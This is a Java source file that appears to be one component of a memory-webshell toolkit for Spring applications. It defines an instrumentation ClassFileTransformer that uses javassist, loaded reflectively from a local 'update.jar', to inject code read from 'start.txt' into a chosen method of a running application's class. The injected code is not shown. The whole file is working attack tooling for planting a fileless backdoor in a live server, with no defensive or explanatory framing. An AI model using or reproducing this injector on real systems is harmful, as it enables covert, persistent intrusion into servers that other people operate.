package com.stdout.springMem;

import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.security.ProtectionDomain;

public class SpringMemTransformer implements ClassFileTransformer {
    public static final String TransformedClassName = SpringMemShell.TransformedClassName;
    public static final String TransformedEqualName = SpringMemShell.TransformedClassName.replace(".", "/");
    public static final String TransformedMethodName = SpringMemShell.TransformedMethodName;

    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        URL url = null;
        try {
            url = new URL("file:./update.jar");
            URLClassLoader classLoader = new URLClassLoader(new URL[] {url}, Thread.currentThread().getContextClassLoader());

            if (className.equals(TransformedEqualName)) {
                try {
                    Class<?> pool = classLoader.loadClass("javassist.ClassPool");
                    Method getDefault = pool.getDeclaredMethod("getDefault", null);
                    getDefault.setAccessible(true);
                    Object poolObject = getDefault.invoke(null, null);
                    if (classBeingRedefined != null) {
                        Class myClass = classLoader.loadClass("javassist.ClassClassPath");
                        Constructor constructor = myClass.getDeclaredConstructor(Class.class);
                        Object ccp = constructor.newInstance(classBeingRedefined);

                        Class classPath = classLoader.loadClass("javassist.ClassPath");
                        Method insertClassPath = pool.getDeclaredMethod("insertClassPath", new Class[]{classPath});

                        insertClassPath.invoke(poolObject, new Object[]{ccp});
                    }
                    Method get = pool.getDeclaredMethod("get", new Class[] {String.class});
                    Object cc = get.invoke(poolObject, new Object[] {TransformedClassName});

                    Class<?> ctc = classLoader.loadClass("javassist.CtClass");
                    Method gmd = ctc.getDeclaredMethod("getDeclaredMethod", new Class[]{String.class});
                    Object m = gmd.invoke(cc, new Object[]{TransformedMethodName});

                    Method defrost = ctc.getDeclaredMethod("defrost", null);
                    defrost.invoke(cc, null);

                    Class<?> ctb = classLoader.loadClass("javassist.CtBehavior");
                    Method insertBefore = ctb.getDeclaredMethod("insertBefore", new Class[]{String.class});

                    String source = SpringMemModels.readSource("start.txt");
                    insertBefore.invoke(m, new Object[] {source});
                    Method toByteCode = ctc.getDeclaredMethod("toBytecode", null);
                    byte[] byteCode = (byte[]) toByteCode.invoke(cc, null);

                    defrost.invoke(cc, null);

                    Method detach = ctc.getDeclaredMethod("detach", null);
                    detach.invoke(cc, null);
                    return byteCode;
                } catch (Exception e){
                    e.printStackTrace();
                }


            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        return null;
    }

}
